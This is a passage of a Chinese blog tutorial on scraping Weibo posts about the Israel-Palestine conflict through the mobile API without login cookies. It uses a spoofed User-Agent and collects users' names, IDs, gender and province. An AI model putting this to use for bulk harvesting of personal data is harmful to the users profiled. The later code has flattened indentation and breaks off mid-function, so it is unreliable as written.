        <content type="html"><![CDATA[<hr><h1 id="一、对微博页面的分析"><a href="#一、对微博页面的分析" class="headerlink" title="一、对微博页面的分析"></a>一、对微博页面的分析</h1><h2 id="一-对微博网页端的分析"><a href="#一-对微博网页端的分析" class="headerlink" title="(一)对微博网页端的分析"></a>(一)对微博网页端的分析</h2><ol><li>首先，我们打开微博，发现从电脑端打开微博，网址为：<a href="https://s.weibo.com/">Sina Visitor System</a></li></ol><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612202423931-593058111.png" alt="image"></p><ol start="2"><li>我们搜索关键字：巴以冲突，会发现其对应的 URL：<a href="https://s.weibo.com/weibo?q=%E5%B7%B4%E4%BB%A5%E5%86%B2%E7%AA%81">巴以冲突</a></li></ol><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612202437353-1375848171.png" alt="image"></p><h3 id="1-URL-编码-解码"><a href="#1-URL-编码-解码" class="headerlink" title="(1)URL 编码&#x2F;解码"></a>(1)URL 编码&#x2F;解码</h3><p>通过对 URL 进行分析，不难发现我们输入的是中文“巴以冲突”，但是真实的链接却不含中文，这是因为链接中的中文被编码了。我们将复制来的 URL 进行解码操作便可以得知。</p><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612202534242-1178644269.png" alt="image"></p><p>在巴以冲突这个页面里面可以看到高级搜索，打开高级搜索后发现可以对微博的发布时间进行筛选，还可以对微博类型、微博包含的内容进行筛选。<br>一开始，想的便是从这下手，非常方便爬取指定时间内指定话题下的微博内容。</p><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612202548656-62215039.png" alt="image"></p><h3 id="2-抓包分析请求网址-请求方法-响应内容"><a href="#2-抓包分析请求网址-请求方法-响应内容" class="headerlink" title="(2)抓包分析请求网址&#x2F;请求方法&#x2F;响应内容"></a>(2)抓包分析请求网址&#x2F;请求方法&#x2F;响应内容</h3><p>接着，打开开发者工具，对抓包进行分析，我们可以看到请求网址发生了变化，<br><code>请求网址</code>为：<br><a href="https://weibo.com/ajax/side/search?q=%E5%B7%B4%E4%BB%A5%E5%86%B2%E7%AA%81">https://weibo.com/ajax/side/search?q=%E5%B7%B4%E4%BB%A5%E5%86%B2%E7%AA%81</a>，<br><code>请求方法</code>是： GET</p><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612202715332-1510230893.png" alt="image"></p><p>点开预览、查看相应内容，可以发现该请求网址返回的 json 文件内容对应的就是页面中加载的微博内容。</p><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612202728738-276926097.png" alt="image"></p><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612202738337-1011947238.png" alt="image"></p><p>于是，便开始在 pycharm 中编写请求代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  <span class="comment"># 导入requests库，用于发送HTTP请求</span></span><br><span class="line">url = <span class="string">&#x27;https://weibo.com/ajax/side/search?q=%E5%B7%B4%E4%BB%A5%E5%86%B2%E7%AA%81&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(url)</span><br><span class="line">response = requests.get(url=url)  <span class="comment"># 发送HTTP GET请求</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;响应状态码是：<span class="subst">&#123;response.status_code&#125;</span>&#x27;</span>)  <span class="comment"># 如果响应状态码为200（成功）</span></span><br><span class="line"><span class="built_in">print</span>(response.json())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612202800994-1370369637.png" alt="image"></p><hr><h2 id="二-网页端的局限性（cookie-、微博数量问题）"><a href="#二-网页端的局限性（cookie-、微博数量问题）" class="headerlink" title="(二)网页端的局限性（cookie 、微博数量问题）"></a>(二)网页端的局限性（cookie 、微博数量问题）</h2><p>虽然状态码返回 200 表示成功，但是 json 文件里面只有很少的 50 条微博数据，这对于爬虫而言是非常少的数据。但是，当我们向下滑动想要进一步探究、查看更多数据时，会发现这时候微博官方不给我们查看，要求我们登陆账号后才能查看。</p><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612202810744-641308944.png" alt="image"></p><p>如果需要登陆账号才能查看更多微博内容，那么意味着在爬虫里面发送 http 请求时需要使用到账号的 cookie，又考虑到网站肯定存在对爬虫的检测，如果使用 cookie 的话，肯定会被封禁的，这不仅仅会影响爬取微博数据的效率，还会造成短时间内无法打开网站。</p><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612202818678-1102411604.png" alt="image"></p><p>因此，这时候便不再尝试从当前网址下手爬取数据。</p><hr><h2 id="三-微博手机端的分析"><a href="#三-微博手机端的分析" class="headerlink" title="(三)微博手机端的分析"></a>(三)微博手机端的分析</h2><p>便开始在网上查阅相关的资料，想要找到一个无需 cookie 便能爬取微博数据内容，同时又能突破只能查看 50 条数据的局限性。最终，在某网页上面有网友提了一嘴，说：“在手机端界面爬取微博数据，比在网页端爬取更加方便、局限性相对来说更小”。<br>于是，便开始准备从手机端网址开始下手，先尝试着验证下网友说的是否正确。<br>手机端的网址是：<a href="https://m.weibo.cn/">https://m.weibo.cn</a></p><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612202827218-459095831.png" alt="image"></p><p>在搜索框内搜索巴以冲突，找到其对应的 URL：<a href="https://m.weibo.cn/search?containerid=100103type=1&q=%E5%B7%B4%E4%BB%A5%E5%86%B2%E7%AA%81">https://m.weibo.cn/search?containerid=100103type%3D1%26q%3D%E5%B7%B4%E4%BB%A5%E5%86%B2%E7%AA%81</a></p><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612202834408-1166089826.png" alt="image"></p><h3 id="1-URL-编码-解码-1"><a href="#1-URL-编码-解码-1" class="headerlink" title="(1)URL 编码&#x2F;解码"></a>(1)URL 编码&#x2F;解码</h3><p>不难发现，此处的中文仍然进行了编码操作，我们需要对链接进行解码查看是否为原来的 URL。</p><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612202842524-1480273132.png" alt="image"></p><h3 id="2-抓包分析"><a href="#2-抓包分析" class="headerlink" title="(2)抓包分析"></a>(2)抓包分析</h3><p>打开开发者工具，开始对网页抓包进行分析，我们在 Fetch&#x2F;XHR 里面可以找到 https 请求，<br>请求网址是：<a href="https://m.weibo.cn/api/container/getIndex?containerid=100103type=1&q=%E5%B7%B4%E4%BB%A5%E5%86%B2%E7%AA%81&page_type=searchall">https://m.weibo.cn/api/container/getIndex?containerid=100103type%3D1%26q%3D%E5%B7%B4%E4%BB%A5%E5%86%B2%E7%AA%81&amp;page_type&#x3D;searchall</a>，<br>请求方法是：GET，<br>请求参数是：containerid&#x3D;100103type%3D1%26q%3D%E5%B7%B4%E4%BB%A5%E5%86%B2%E7%AA%81&amp;page_type&#x3D;searchall</p><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612202855296-794555591.png" alt="image"></p><h3 id="3-请求参数分析"><a href="#3-请求参数分析" class="headerlink" title="(3)请求参数分析"></a>(3)请求参数分析</h3><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612202903024-1742229525.png" alt="image"></p><p>由于微博每页都有数量限制，因此当下滑到一定程度时，又有新的微博内容显示，因此可以得知网页数据是通过ajax文件格式加载出来的。所以，找到其中的请求参数，发现存在page参数，这里 page的参数为 2，就是代表第二页。这个时候不难猜测出从本页面下手，并不存在微博内容数量的限制，我们只需要设置好 page 参数即可。</p><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612202908028-209824543.png" alt="image"></p><p>于是便开始写相关的代码，首先写好请求参数 params</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">params = &#123;</span><br><span class="line">        <span class="string">&#x27;containerid&#x27;</span>: <span class="string">f&#x27;100103type=1&amp;q=#<span class="subst">&#123;keyword&#125;</span>#&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;page_type&#x27;</span>: <span class="string">&#x27;searchall&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;page&#x27;</span>: page</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="4-json-内容分析"><a href="#4-json-内容分析" class="headerlink" title="(4)json 内容分析"></a>(4)json 内容分析</h3><p>接着我们打开请求网址<a href="https://m.weibo.cn/api/container/getIndex?containerid=100103type=1&q=%E5%B7%B4%E4%BB%A5%E5%86%B2%E7%AA%81&page_type=searchall">https://m.weibo.cn/api/container/getIndex?containerid=100103type%3D1%26q%3D%E5%B7%B4%E4%BB%A5%E5%86%B2%E7%AA%81&amp;page_type&#x3D;searchall</a>，发现下面微博数据仍然是以 json 格式显示的，因此我们需要对 json 文件内容进行分析。</p><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612202919364-674715195.png" alt="image"></p><p>首先，我们将 json 文件内容复制到 json 格式化检验里，发现 返回的 json 是正确的 json 文件</p><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612202926031-1927247094.png" alt="image"></p><p>为了方便对 json 文件内容的分析，我们选取 json 视图对 json 进行可视化分析。<br>不难发现，微博内容存在于 json&#x2F;data&#x2F;cards&#x2F;里面，下图中的 0～22 均代表一条条微博内容等等数据。<br><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612202933240-966909864.png" alt="image"></p><h3 id="5-查看-提取-json-有效信息"><a href="#5-查看-提取-json-有效信息" class="headerlink" title="(5)查看&#x2F;提取 json 有效信息"></a>(5)查看&#x2F;提取 json 有效信息</h3><p>结合网页内容对 cards 下面的内容进行分析，我们可以发现：<br>–&gt;在 mblog 中存在判断微博是否为长文本一项 isLongText : true<br>其他有用内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;wid&#x27;</span>: item.get(<span class="string">&#x27;id&#x27;</span>),  <span class="comment"># 微博ID</span></span><br><span class="line"><span class="string">&#x27;user_name&#x27;</span>: item.get(<span class="string">&#x27;user&#x27;</span>).get(<span class="string">&#x27;screen_name&#x27;</span>),  <span class="comment"># 微博发布者名称</span></span><br><span class="line"><span class="string">&#x27;user_id&#x27;</span>: item.get(<span class="string">&#x27;user&#x27;</span>).get(<span class="string">&#x27;id&#x27;</span>),  <span class="comment"># 微博发布者ID</span></span><br><span class="line"><span class="string">&#x27;gender&#x27;</span>: item.get(<span class="string">&#x27;user&#x27;</span>).get(<span class="string">&#x27;gender&#x27;</span>),  <span class="comment"># 微博发布者性别</span></span><br><span class="line"><span class="string">&#x27;publish_time&#x27;</span>: time_formater(item.get(<span class="string">&#x27;created_at&#x27;</span>)),  <span class="comment"># 微博发布时间</span></span><br><span class="line"><span class="string">&#x27;source&#x27;</span>: item.get(<span class="string">&#x27;source&#x27;</span>),  <span class="comment"># 微博发布来源</span></span><br><span class="line"><span class="string">&#x27;status_province&#x27;</span>: item.get(<span class="string">&#x27;status_province&#x27;</span>),  <span class="comment"># 微博发布者所在省份</span></span><br><span class="line"><span class="string">&#x27;text&#x27;</span>: pq(item.get(<span class="string">&quot;text&quot;</span>)).text(),  <span class="comment"># 仅提取内容中的文本</span></span><br><span class="line"><span class="string">&#x27;like_count&#x27;</span>: item.get(<span class="string">&#x27;attitudes_count&#x27;</span>),  <span class="comment"># 点赞数</span></span><br><span class="line"><span class="string">&#x27;comment_count&#x27;</span>: item.get(<span class="string">&#x27;comments_count&#x27;</span>),  <span class="comment"># 评论数</span></span><br><span class="line"><span class="string">&#x27;forward_count&#x27;</span>: item.get(<span class="string">&#x27;reposts_count&#x27;</span>),  <span class="comment"># 转发数</span></span><br></pre></td></tr></table></figure><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612202944457-472145894.png" alt="image"></p><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612202950811-314115177.png" alt="image"></p><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612202956568-783827957.png" alt="image"></p><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612203007711-1598835858.png" alt="image"></p><p><img src="https://img2024.cnblogs.com/blog/3455765/202406/3455765-20240612203011939-532879947.png" alt="image"></p><p>到了这里，我惊讶的发现爬取时并不需要用户的 cookie，可以证明网友的某些说法是正确的。</p><hr><h1 id="代码实现过程："><a href="#代码实现过程：" class="headerlink" title="代码实现过程："></a>代码实现过程：</h1><h2 id="导包"><a href="#导包" class="headerlink" title="导包"></a>导包</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  <span class="comment"># 导入requests库，用于发送HTTP请求</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode  <span class="comment"># 导入urlencode函数，用于构建URL参数</span></span><br><span class="line"><span class="keyword">import</span> time  <span class="comment"># 导入time模块，用于添加时间延迟</span></span><br><span class="line"><span class="keyword">import</span> random  <span class="comment"># 导入random模块，用于生成随机数</span></span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq  <span class="comment"># 导入PyQuery库，用于解析HTML和XML</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime  <span class="comment"># 导入datetime模块，用于处理日期和时间</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> csv</span><br></pre></td></tr></table></figure><h2 id="设置基础的-URL-以及请求参数-params"><a href="#设置基础的-URL-以及请求参数-params" class="headerlink" title="设置基础的 URL 以及请求参数 params"></a>设置基础的 URL 以及请求参数 params</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置代理等（新浪微博的数据是用ajax异步下拉加载的，network-&gt;xhr）</span></span><br><span class="line">host = <span class="string">&#x27;m.weibo.cn&#x27;</span>  <span class="comment"># 设置主机地址</span></span><br><span class="line">base_url = <span class="string">&#x27;https://%s/api/container/getIndex?&#x27;</span> % host  <span class="comment"># 基础URL，用于构建API请求URL</span></span><br><span class="line">user_agent = <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36&#x27;</span>  <span class="comment"># 设置用户代理信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置请求头</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: host,  <span class="comment"># 设置请求头中的Host字段</span></span><br><span class="line">    <span class="string">&#x27;keep&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,  <span class="comment"># 设置请求头中的keep字段</span></span><br><span class="line">    <span class="comment"># 话题巴以冲突下的URL对应的Referer</span></span><br><span class="line">    <span class="comment"># &#x27;Referer&#x27;: &#x27;https://m.weibo.cn/search?containerid=100103type%3D1%26q%3D%E5%B7%B4%E4%BB%A5%E5%86%B2%E7%AA%81&#x27;,  #</span></span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: user_agent  <span class="comment"># 设置请求头中的User-Agent字段</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="将微博的时间格式转换为标准的日期时间格式"><a href="#将微博的时间格式转换为标准的日期时间格式" class="headerlink" title="将微博的时间格式转换为标准的日期时间格式"></a>将微博的时间格式转换为标准的日期时间格式</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用于将微博的时间格式转换为标准的日期时间格式</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">time_formater</span>(<span class="params">input_time_str</span>):</span><br><span class="line">    input_format = <span class="string">&#x27;%a %b %d %H:%M:%S %z %Y&#x27;</span>  <span class="comment"># 输入时间的格式</span></span><br><span class="line">    output_format = <span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>  <span class="comment"># 输出时间的格式</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> datetime.strptime(input_time_str, input_format).strftime(output_format)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="按页数-page-抓取微博内容数据"><a href="#按页数-page-抓取微博内容数据" class="headerlink" title="按页数 page 抓取微博内容数据"></a>按页数 page 抓取微博内容数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 按页数抓取数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_single_page</span>(<span class="params">page, keyword</span>):</span><br><span class="line">    <span class="comment"># https://m.weibo.cn/api/container/getIndex?containerid=100103type=1&amp;q=巴以冲突&amp;page_type=searchall&amp;page=1</span></span><br><span class="line">    <span class="comment"># 构建请求参数</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;containerid&#x27;</span>: <span class="string">f&#x27;100103type=1&amp;q=#<span class="subst">&#123;keyword&#125;</span>#&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;page_type&#x27;</span>: <span class="string">&#x27;searchall&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;page&#x27;</span>: page</span><br><span class="line">    &#125;</span><br><span class="line">    url = base_url + urlencode(params)  <span class="comment"># 将输入的中文关键词编码，构建出完整的API请求URL</span></span><br><span class="line">    <span class="built_in">print</span>(url)  <span class="comment"># 打印请求的URL</span></span><br><span class="line">    error_times = <span class="number">3</span>  <span class="comment"># 设置错误尝试次数</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = requests.get(url, headers=headers)  <span class="comment"># 发送HTTP GET请求</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:  <span class="comment"># 如果响应状态码为200（成功）</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(response.json().get(<span class="string">&#x27;data&#x27;</span>).get(<span class="string">&#x27;cards&#x27;</span>)) &gt; <span class="number">0</span>:  <span class="comment"># 检查是否有数据</span></span><br><span class="line">                <span class="keyword">return</span> response.json()  <span class="comment"># 返回JSON响应数据</span></span><br><span class="line">        time.sleep(<span class="number">3</span>)  <span class="comment"># 等待3秒</span></span><br><span class="line">        error_times += <span class="number">1</span>  <span class="comment"># 错误尝试次数增加</span></span><br><span class="line">        <span class="keyword">if</span> error_times &gt; <span class="number">3</span>:  <span class="comment"># 如果连续出错次数超过3次</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span>  <span class="comment"># 返回空值</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="定义长文本微博内容的爬取"><a href="#定义长文本微博内容的爬取" class="headerlink" title="定义长文本微博内容的爬取"></a>定义长文本微博内容的爬取</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 长文本爬取代码段</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getLongText</span>(<span class="params">lid</span>):  <span class="comment"># 根据长文本的ID获取长文本内容</span></span><br><span class="line">    <span class="comment"># 长文本请求头</span></span><br><span class="line">    headers_longtext = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: host,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://m.weibo.cn/status/&#x27;</span> + lid,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: user_agent</span><br><span class="line">    &#125;</span><br><span class="line">    params = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: lid</span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&#x27;https://m.weibo.cn/statuses/extend?&#x27;</span> + urlencode(params)  <span class="comment"># 构建获取长文本内容的URL</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(url, headers=headers_longtext)  <span class="comment"># 发送HTTP GET请求</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:  <span class="comment"># 如果响应状态码为200（成功）</span></span><br><span class="line">    jsondata = response.json()  <span class="comment"># 解析JSON响应数据</span></span><br><span class="line">    tmp = jsondata.get(<span class="string">&#x27;data&#x27;</span>)  <span class="comment"># 获取长文本数据</span></span><br><span class="line">    <span class="keyword">return</span> pq(tmp.get(<span class="string">&quot;longTextContent&quot;</span>)).text()  <span class="comment"># 解析长文本内容</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="对-json-中的有效信息进行提取"><a href="#对-json-中的有效信息进行提取" class="headerlink" title="对 json 中的有效信息进行提取"></a>对 json 中的有效信息进行提取</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改后的页面爬取解析函数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_page</span>(<span class="params">json_data</span>):</span><br><span class="line">    <span class="keyword">global</span> count  <span class="comment"># 使用全局变量count</span></span><br><span class="line">    items = json_data.get(<span class="string">&#x27;data&#x27;</span>).get(<span class="string">&#x27;cards&#x27;</span>)  <span class="comment"># 获取JSON数据中的卡片列表</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> index, item <span class="keyword">in</span> <span class="built_in">enumerate</span>(items):</span><br><span class="line">    <span class="keyword">if</span> item.get(<span class="string">&#x27;card_type&#x27;</span>) == <span class="number">7</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;导语&#x27;</span>)</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span> item.get(<span class="string">&#x27;card_type&#x27;</span>) == <span class="number">8</span> <span class="keyword">or</span> (item.get(<span class="string">&#x27;card_type&#x27;</span>) == <span class="number">11</span> <span class="keyword">and</span> item.get(<span class="string">&#x27;card_group&#x27;</span>) <span class="keyword">is</span> <span class="literal">None</span>):</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> item.get(<span class="string">&#x27;mblog&#x27;</span>, <span class="literal">None</span>):</span><br><span class="line">    item = item.get(<span class="string">&#x27;mblog&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    item = item.get(<span class="string">&#x27;card_group&#x27;</span>)[<span class="number">0</span>].get(<span class="string">&#x27;mblog&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> item:</span><br><span class="line">    <span class="keyword">if</span> item.get(<span class="string">&#x27;isLongText&#x27;</span>) <span class="keyword">is</span> <span class="literal">False</span>:  <span class="comment"># 不是长文本</span></span><br><span class="line">    data = &#123;</span><br><span class="line">    <span class="string">&#x27;wid&#x27;</span>: item.get(<span class="string">&#x27;id&#x27;</span>),  <span class="comment"># 微博ID</span></span><br><span class="line">    <span class="string">&#x27;user_name&#x27;</span>: item.get(<span class="string">&#x27;user&#x27;</span>).get(<span class="string">&#x27;screen_name&#x27;</span>),  <span class="comment"># 微博发布者名称</span></span><br><span class="line">    <span class="string">&#x27;user_id&#x27;</span>: item.get(<span class="string">&#x27;user&#x27;</span>).get(<span class="string">&#x27;id&#x27;</span>),  <span class="comment"># 微博发布者ID</span></span><br><span class="line">    <span class="string">&#x27;gender&#x27;</span>: item.get(<span class="string">&#x27;user&#x27;</span>).get(<span class="string">&#x27;gender&#x27;</span>),  <span class="comment"># 微博发布者性别</span></span><br><span class="line">    <span class="string">&#x27;publish_time&#x27;</span>: time_formater(item.get(<span class="string">&#x27;created_at&#x27;</span>)),  <span class="comment"># 微博发布时间</span></span><br><span class="line">    <span class="string">&#x27;source&#x27;</span>: item.get(<span class="string">&#x27;source&#x27;</span>),  <span class="comment"># 微博发布来源</span></span><br><span class="line">    <span class="string">&#x27;status_province&#x27;</span>: item.get(<span class="string">&#x27;status_province&#x27;</span>),  <span class="comment"># 微博发布者所在省份</span></span><br><span class="line">    <span class="string">&#x27;text&#x27;</span>: pq(item.get(<span class="string">&quot;text&quot;</span>)).text(),  <span class="comment"># 仅提取内容中的文本</span></span><br><span class="line">    <span class="string">&#x27;like_count&#x27;</span>: item.get(<span class="string">&#x27;attitudes_count&#x27;</span>),  <span class="comment"># 点赞数</span></span><br><span class="line">    <span class="string">&#x27;comment_count&#x27;</span>: item.get(<span class="string">&#x27;comments_count&#x27;</span>),  <span class="comment"># 评论数</span></span><br><span class="line">    <span class="string">&#x27;forward_count&#x27;</span>: item.get(<span class="string">&#x27;reposts_count&#x27;</span>),  <span class="comment"># 转发数</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span>:  <span class="comment"># 长文本涉及文本的展开</span></span><br><span class="line">    tmp = getLongText(item.get(<span class="string">&#x27;id&#x27;</span>))  <span class="comment"># 调用函数获取长文本内容</span></span><br><span class="line">    data = &#123;</span><br><span class="line">    <span class="string">&#x27;wid&#x27;</span>: item.get(<span class="string">&#x27;id&#x27;</span>),  <span class="comment"># 微博ID</span></span><br><span class="line">    <span class="string">&#x27;user_name&#x27;</span>: item.get(<span class="string">&#x27;user&#x27;</span>).get(<span class="string">&#x27;screen_name&#x27;</span>),  <span class="comment"># 微博发布者名称</span></span><br><span class="line">    <span class="string">&#x27;user_id&#x27;</span>: item.get(<span class="string">&#x27;user&#x27;</span>).get(<span class="string">&#x27;id&#x27;</span>),  <span class="comment"># 微博发布者ID</span></span><br><span class="line">    <span class="string">&#x27;gender&#x27;</span>: item.get(<span class="string">&#x27;user&#x27;</span>).get(<span class="string">&#x27;gender&#x27;</span>),  <span class="comment"># 微博发布者性别</span></span><br><span class="line">    <span class="string">&#x27;publish_time&#x27;</span>: time_formater(item.get(<span class="string">&#x27;created_at&#x27;</span>)),  <span class="comment"># 微博发布时间</span></span><br><span class="line">    <span class="string">&#x27;source&#x27;</span>: item.get(<span class="string">&#x27;source&#x27;</span>),  <span class="comment"># 微博发布来源</span></span><br><span class="line">    <span class="string">&#x27;text&#x27;</span>: tmp,  <span class="comment"># 仅提取内容中的文本</span></span><br><span class="line">    <span class="string">&#x27;status_province&#x27;</span>: item.get(<span class="string">&#x27;status_province&#x27;</span>),  <span class="comment"># 微博发布者所在省份</span></span><br><span class="line">    <span class="string">&#x27;like_count&#x27;</span>: item.get(<span class="string">&#x27;attitudes_count&#x27;</span>),  <span class="comment"># 点赞数</span></span><br><span class="line">    <span class="string">&#x27;comment_count&#x27;</span>: item.get(<span class="string">&#x27;comments_count&#x27;</span>),  <span class="comment"># 评论数</span></span><br><span class="line">    <span class="string">&#x27;forward_count&#x27;</span>: item.get(<span 